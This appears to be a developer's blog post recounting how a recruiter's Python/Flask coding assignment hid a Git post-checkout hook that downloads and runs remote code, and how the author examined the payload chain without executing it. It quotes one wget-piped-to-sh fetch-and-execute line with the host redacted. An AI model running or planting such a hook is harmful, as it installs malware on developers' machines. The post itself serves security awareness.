I Was Asked to Review a Python Coding Assignment. Then I Found a Git Hook.

How a routine job application turned into a lesson about Git hooks, supply-chain attacks, and why developers should treat coding assignments as untrusted software

I faced a moment when a familiar command suddenly looks different.

It was

git checkout main

It means one thing:

Switch to the branch containing the code I need.

But on yesterday, I had discovered something inside the repository:

.git/hooks/post-checkout

And that file was capable of downloading code from the internet and executing it inside my machine.

The uncomfortable part?

I had been asked to switch to main.

  1. Was that coincidence?
  2. Was it a security test?
  3. Or was something else happening?

I didn’t have the answer.

I did not run the command until I understood what it could trigger.

This is the story of how a routine coding assignment became an investigation into a hidden Git-based attack surface.

How it Framed?

The assignment itself looked ordinary. I received a ZIP containing a Python/Flask project called Skyron.

The request was simple: review the code, with particular attention to:skyron/block.py

It is like a regular coding assignment right. As a developer, I would have been below workflow:

That’s how developers approach assignments.

We trained our mind to focus about the quality of the code.

We never or rarely start by asking:

What can this repository do to my computer?

This question turned out to be much more important in right now in this IT industry.

The First Red Flag Was Hidden in Plain Sight

There was nothing suspicious about the project when I opened the ZIP. It looked like a normal Python/Flask coding assignment.

Git metadata is normally hidden. When developers open a project in an IDE, they see something like:

The .git directory is hidden from the view.

when developers know it exists, they normally do not spend much time looking inside it.

That is understandable…

Developers including me think .git as the place where Git stores commits, branches, configuration and repository history.

Also developers use hooks to formating, linting, testing, commit validation and etc.

So when I receives this coding assignment, the attentions goes somewhere else like in technical perspective and not what executable code is hiding inside .git/hooks

Since I didnt meet the recuireter on a call. There had not been a technical decision. There was not any introduction before this assignment

Since I had some security experience, and overtime I have developed a habit that has saved me from trouble more than once:

I look at what I’m actually being given before I run someone else’s code

If I preciously say it was my gut feeling. So,

  1. I opened the repository metadata
  2. I checked .git
  3. Also, I checked .git/hooks
  4. I found three hooks and opened them one by one.

Rigt now, I felt the coding assignment was not just a coding assignment anymore.

The suspicious Hook

The post-checkout hook contained a command like below

wget -q0 'http://<remote-server>/<path> -L | sh > /dev/null 2>&1 &

If you see this command,

  1. wget download something from a remote server.
  2. the downloaded content is sent to standard output.
  3. The content directly attached into shell

I stopped to look this zip as code. I started to look as an untrusted software acrtifact.

Interesting Part in these hooks

There were three hooks. and all these hooks has been created with OS-specific behaviour.

It was aimed to run in across all OS.

Why would a small Python coding assignment need executable hooks that download remote code?

I could not find a reasonal application level explain so I reach out to recuriter

The ultimate reply from the recuireter

If you see the conversation between me and recuireter.

The response was essentially:

Could you please switch to the main branch?

since the file is missing in the current branch so that would be completely reasonable except I knew there was a post-checkout hook.

I was being asked to perform was:

git checkout main

This common routine developer instruction had a completely different security implication.

I wasn’t prepared to assume malicious intent but I was also not prepared to find out what happened by executing it.

I started with Git Forensis

The project contained normal commits, including:

  1. e5d0296 Initial commit
  2. 8f0979c initial setup
  3. 288913b unstaged block

The application files were there. block.py was there on main. However the malicious hooks were not present in the Git trees I examined.

The repository looked like this:

These hooks weren’t normal tracked project files in the Git history I examined.

The repository’s reflog also showed later checkout activity associated with a root account on a host.

So Something happened between the original repository history and the final archive.

What actually this hook is downloading?

I will not go and execute and find it instead of that I treated the payload as text.

The hook pointed to a remote script.

So I inspected the content returned by the server using an online HTTP inspection tool, WebSniffer.

It pretended to be a setup script.

there was another script is downloaded form the current script tokenlinux.sh this tokenlinux.sh had different scripts and one is parser.js

this parser.js will be executed eventually with node parser.js

The code was intentionally difficult to understand it.

Why would a simple token parser need to hide what it is doing?

I understood the pattern and it also had filesystem and OS access.

The payload seems like to be using remote data as part of its execution logic rather than simply downloading a static JavaScript file.

This is a characteristic of a loader-style design.

How it was Delivered to a developer

The delivery mechanism was,

you receive a coding assignment.

you download it. you did not see anything called malware.

You see a normal python coding assignment.

Then someone tells you to switch to main branch.

and when you type

git checkout main

the hook runs behind the command and it started to install the backdoor/malware in your system.

It shows us,

How git hooks is changed to act like an attacking surface.

Git hooks are executable code. Treat them like executable code.

What saved me?

I didn’t discover the problem because an antivirus popup appeared.

I didn’t execute the malware and then investigate the damage.

I didn’t wait for my machine to behave strangely.

I simply asked:

“What is inside .git?"

That took very little time and that small question completely changed the outcome.

So I pleased developers before you start to work on any assignments or repositories

Why coding Assignments deserve special attention

When we are applying for jobs, we are trying to demonstare what we can do

  • follow instructions
  • work independently
  • use unfamiliar code
  • setup projects
  • solve problems quickly

It normally creates a natural pressure to execute whatever we are given.

We follow their interviewer/hr instructions blindly sometime and this is the point we need securtiy awareness

Always, beleive your gut feelings. If it doubts something ensure whether it is trustable or not. because since you have many years of expereince it might automatically develop inside you without knowing yourself.

A final note on attribution

I am intentionally not naming the person who sent the assignment or claiming that the recruiter intentionally created the malicious artifact.

The technical evidence I examined supports a much narrower conclusion: the artifact contained suspicious/malicious executable behavior and a multi-stage payload chain.

That’s an important lesson in security itself:

Findings are evidence. Attribution is a separate investigation.

And I think responsible security writing should make that distinction clear.
